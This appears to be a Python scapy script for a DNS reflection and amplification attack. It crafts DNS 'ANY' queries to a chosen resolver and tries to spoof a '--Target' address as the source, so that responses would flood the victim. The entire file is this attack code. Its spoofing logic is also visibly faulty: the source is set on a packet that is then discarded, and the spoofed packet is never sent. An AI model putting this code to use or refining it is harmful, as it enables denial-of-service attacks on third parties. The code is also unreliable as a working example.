from scapy.all import *

from argparse import ArgumentParser
import sys

def construct_IP(DNSaddr):
    # Construct IP packet
    ip = IP()
    ip.dst = DNSaddr
    ip.show()
    return ip

def construct_UDP():
    # Construct UDP packet
    udp = UDP()
    udp.display()
    return udp

def construct_DNS():
    # Construct DNS packet
    dns = DNS()
    dns.rd = 1
    dns.qdcount = 1
    dns.display()
    return dns

def construct_DNSQR(qtype=255, qname = 'qq.com'):
    # Construct DNS Question Record
    q = DNSQR()
    q.qtype = qtype
    q.qname = qname
    q.display()
    return q

def Set_UP(ip, udp, dns, q, target = '127.0.0.1'):
    # Set DNS Question Record in DNS packet
    dns.qd = q

    # Concencate
    r = (ip/udp/dns)
    r.display()
    sr1(r)

    # Set up r
    r.src = target
    r = (ip/udp/dns)
    r.display()
    return r

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-D", "--DNS-server", help="Assign specific DNS server", dest="D")
    parser.add_argument("-T", "--Target", help="target server", dest="T")
    args = parser.parse_args()
    print('DNS server: %s' %args.D)
    print('Target: %s' %args.T)

    ip = construct_IP(DNSaddr = args.D)
    udp = construct_UDP()
    dns = construct_DNS()
    q = construct_DNSQR()

    r = Set_UP(ip, udp, dns, q, args.T)
